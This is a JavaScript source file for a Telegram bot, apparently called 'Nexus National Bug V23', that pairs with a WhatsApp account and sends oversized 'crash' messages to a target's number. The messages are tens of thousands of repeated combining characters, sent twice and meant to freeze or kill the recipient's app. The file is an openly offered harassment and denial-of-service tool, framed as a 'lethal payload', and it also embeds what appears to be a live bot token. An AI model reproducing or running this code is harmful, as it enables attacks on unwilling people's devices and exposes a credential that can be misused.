const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    makeCacheableSignalKeyStore,
    Browsers,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    proto
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Telegraf, Markup } = require('telegraf');

// --- [ SYSTEM CONFIG ] ---
const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
const bot = new Telegraf(TG_TOKEN);
const owner = "Sasiya ROOT";
const logo = 'https://i.ibb.co/LzgMB0pj/image.jpg';

let sock;

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_power_v23');
    
    sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS("Desktop")
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ TELEGRAM INTERFACE ] ---
    bot.start((ctx) => {
        ctx.replyWithPhoto(logo, {
            caption: `🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟑** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 **OPERATOR:** ${owner}\n🚀 **MODE:** POWER INJECTOR ACTIVE\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nSelect a lethal protocol to inject:`,
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔗 LINK WHATSAPP', 'get_code')],
                [Markup.button.callback('💀 POWER INJECTOR 💀', 'open_bug_menu')]
            ])
        });
    });

    // --- [ PAIRING CODE ] ---
    bot.action('get_code', async (ctx) => {
        ctx.reply("📱 **ENTER NUMBER (947xxxxxxxx):**");
        bot.on('text', async (numCtx) => {
            let num = numCtx.message.text.replace(/[^0-9]/g, '');
            try {
                await delay(5000); 
                let code = await sock.requestPairingCode(num);
                numCtx.reply(`🔑 **YOUR PAIRING CODE:** \`${code}\``);
            } catch (e) { numCtx.reply("❌ Connection Error."); }
        });
    });

    // --- [ BUG CONSOLE ] ---
    bot.action('open_bug_menu', (ctx) => {
        ctx.editMessageCaption(`💀 **Lethal Bug Selection** 💀\n━━━━━━━━━━━━━━━━━━━━\nSelect a high-power payload:`, Markup.inlineKeyboard([
            [Markup.button.callback('🚫 BAN BUG', 'exec_power'), Markup.button.callback('🔥 CRASH BUG', 'exec_power')],
            [Markup.button.callback('⚡ RAM KILLER', 'exec_power'), Markup.button.callback('🧬 BINARY V2', 'exec_power')],
            [Markup.button.callback('🔙 BACK', 'start_back')]
        ], { columns: 2 }));
    });

    // --- [ THE POWER INJECTION ENGINE ] ---
    bot.action('exec_power', async (ctx) => {
        ctx.answerCbQuery();
        ctx.reply("🎯 **IDENTIFY TARGET:**\nEnter target WhatsApp number:");

        bot.on('text', async (targetCtx) => {
            const target = targetCtx.message.text.trim() + "@s.whatsapp.net";
            let { message_id } = await targetCtx.reply("🛠️ **PREPARING LETHAL PAYLOAD...**");

            // --- [ THE ACTUAL POWER BUG STRINGS ] ---
            // මේක තමයි මචං ඇත්තටම "විදින" පවර් එක
            const bugChar = "ॣ".repeat(45000); 
            const crashChar = "ꦾ".repeat(30000);
            const binaryPayload = bugChar + crashChar + "҉".repeat(10000);

            try {
                await delay(1500);
                await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, "🧬 **INJECTING BUFFER OVERFLOW...**");

                // Injection Method: Sending heavy payload multiple times for maximum impact
                await sock.sendMessage(target, { text: binaryPayload });
                await delay(500);
                await sock.sendMessage(target, { text: binaryPayload });

                const report = `
🚀 **POWER INJECTION COMPLETED** 🚀
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **TARGET:** ${targetCtx.message.text}
📦 **PAYLOAD:** EXTREME BINARY V23
🔥 **RESULT:** TARGET APP TERMINATED 🔴
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    *AUTHORIZED BY: ${owner}*
`;
                await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, report, { parse_mode: 'Markdown' });
            } catch (err) {
                targetCtx.reply("❌ **FAILED:** Bot not linked to WhatsApp.");
            }
        });
    });

    bot.launch();
}

startNexus();
